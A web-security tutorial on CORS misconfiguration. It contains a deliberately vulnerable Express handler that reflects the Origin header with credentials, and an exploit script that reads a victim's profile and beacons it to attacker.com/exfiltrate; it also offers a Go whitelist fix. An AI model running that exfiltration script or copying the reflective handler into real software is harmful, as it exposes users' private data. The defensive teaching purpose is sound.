# CORS Without Confusion: Mastering Preflight, Origin Constraints, and SOP

Cross-Origin Resource Sharing (CORS) is one of the most widely misunderstood security topics in web development. Many developers view CORS as an API security barrier, but it is actually the exact opposite: **CORS is a browser-enforced mechanism that relaxes the Same-Origin Policy (SOP)**. 

When misconfigured—such as echoing back the requesting origin blindly—CORS strips away the browser's native protections, allowing malicious sites to execute silent, high-privilege read operations against your private API.

---

## The Problem: The Same-Origin Policy and the CORS Hack

The **Same-Origin Policy (SOP)** is a foundational browser security control. It ensures that a script running on `https://evil.com` cannot read sensitive data from `https://bank.com` using the victim's active session cookies.

However, modern web architectures require cross-origin collaboration (e.g., a React client at `https://app.com` fetching resources from an API at `https://api.com`). To facilitate this, CORS was introduced. CORS allows a backend server to instruct the browser: *"I explicitly trust scripts running on origin X to read my response."*

Many developers, struggling with "CORS Blocked" errors during development, deploy highly insecure configurations. The worst offender is returning `Access-Control-Allow-Origin: *` or dynamically reflecting the incoming `Origin` header while allowing credentials.

```
+------------------+                   +--------------------+                   +--------------------+
|  Malicious Site  | --(Sends Fetch)-->|  Victim's Browser  | --(Sends OPTIONS)->|  Backend API Server|
| (https://evil.com) |                   | (Executes JS SOP)  |                    | (Misconfigured AP) |
+------------------+                   +--------------------+                   +--------------------+
         |                                       |                                         |
         |  Executes fetch('api.com/profile')    |                                         |
         |  with credentials:                    |                                         |
         |  - Origin: https://evil.com           |  CORS Preflight (OPTIONS):              |
         |  - Cookies: active session_id         |  Access-Control-Request-Method: GET     |
         +======================================>|========================================>|
                                                 |                                         |
                                                 |  Preflight Response:                    |
                                                 |  Access-Control-Allow-Origin: evil.com  |
                                                 |  Access-Control-Allow-Credentials: true |
                                                 |<========================================+
         |  Browser permits read!                |
         |  SOP is bypassed.                     |
         |<======================================+
         |  Attacker exfiltrates user profile.
```

---

## Vulnerable Code: The Reflective Echo CORS Handler

Consider this Node.js/Express implementation designed to "fix" CORS issues:

```javascript
// VULNERABLE CORS MIDDLEWARE
const express = require('express');
const app = express();

app.use((req, res, next) => {
    const origin = req.headers.origin;

    // VULNERABILITY: Blindly reflecting the incoming Origin header.
    // This instructs the browser that whatever site is currently requesting the data
    // is fully trusted, effectively disabling Same-Origin Policy entirely!
    if (origin) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }

    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    // Handle preflight requests instantly
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }

    next();
});
```

### The Exploit Vector

An attacker hosts a malicious script on `https://evil.com`:

```javascript
// EXPLOIT SCRIPT RUNNING ON EVIL.COM
fetch('https://api.target-app.com/api/v1/profile', { credentials: 'include' })
    .then(response => response.json())
    .then(data => {
        // Exfiltrates the logged-in victim's private profile data to the attacker
        navigator.sendBeacon('https://attacker.com/exfiltrate', JSON.stringify(data));
    });
```

Since the backend echoes `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`, the browser allows `evil.com` to read the private JSON response.

---

## Securing CORS: Deterministic Origin Whitelisting

To properly configure CORS, you must enforce a strict, server-side validation pool.

1. **Explicit Whitelisting:** Maintain a hardcoded, static list of approved client domains. Never read the incoming `Origin` header without validating it against this list.
2. **Handle Preflights Correctly:** For non-simple requests (such as those using `PUT`, `DELETE`, or custom JSON headers like `Content-Type: application/json`), the browser issues a preflight `OPTIONS` request. This must be caught, evaluated against the whitelist, and returned *without* executing any core controller logic.
3. **Control Credential Exposure:** Set `Access-Control-Allow-Credentials` to `true` *only* if the specific origin is validated and requires session cookies or Authorization headers.

### Production-Ready CORS Middleware (Go)

Below is a safe CORS validation engine implemented in Go, featuring structured domain checks and clean preflight processing.

```go
package cors

import (
	"net/http"
	"strings"
)

// CORSHandler defines our secure origin policy controller.
type CORSHandler struct {
	AllowedOrigins map[string]bool
	Next           http.Handler
}

func NewCORSHandler(origins []string, next http.Handler) *CORSHandler {
	allowed := make(map[string]bool)
	for _, o := range origins {
		// Clean and normalize origins
		allowed[strings.ToLower(strings.TrimSpace(o))] = true
	}
	return &CORSHandler{
		AllowedOrigins: allowed,
		Next:           next,
	}
}

func (h *CORSHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	origin := r.Header.Get("Origin")
	originLower := strings.ToLower(origin)

	// Step 1: Validate the incoming Origin header
	if origin != "" {
		if h.AllowedOrigins[originLower] {
			// Origin is trusted, explicitly assign the access headers
			w.Header().Set("Access-Control-Allow-Origin", origin)
			w.Header().Set("Access-Control-Allow-Credentials", "true")
			w.Header().Set("Vary", "Origin") // Instructs downstream caches to partition cache by origin
		} else {
			// Untrusted origin: Do not set CORS headers. 
			// Browser will block the response read automatically.
			w.WriteHeader(http.StatusForbidden)
			return
		}
	}

	// Step 2: Process Preflight Handshake (OPTIONS)
	if r.Method == http.MethodOptions {
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
		// Cache preflight permissions for 10 minutes to minimize overhead
		w.Header().Set("Access-Control-Max-Age", "600") 
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// Step 3: Pass request down the middleware chain
	h.Next.ServeHTTP(w, r)
}
```

---

## Architectural Protections

1. **Avoid Subdomain Wildcarding:** Do not use loose regex checks like `.*\.target-app\.com` to validate origins. Attackers can register domains like `attacker-target-app.com` or create payloads on vulnerable staging environments (`staging.target-app.com`) to bypass the filter. Use exact string matching.
2. **Avoid CORS Entirely via Reverse Proxies:** Where possible, host your client assets and your API on the *same logical origin* (e.g., client at `target.com` and API at `target.com/api`) using an Application Load Balancer or reverse proxy (NGINX/Cloudflare). This leverages Same-Origin Policy natively and eliminates CORS overhead entirely.
3. **Partition JWTs and Auth Headers:** If using token-based authentication (such as `Authorization: Bearer <JWT>`), avoid relying on cookies. Browsers do not attach custom authorization headers to cross-origin requests by default, providing native protection against unauthorized reads.
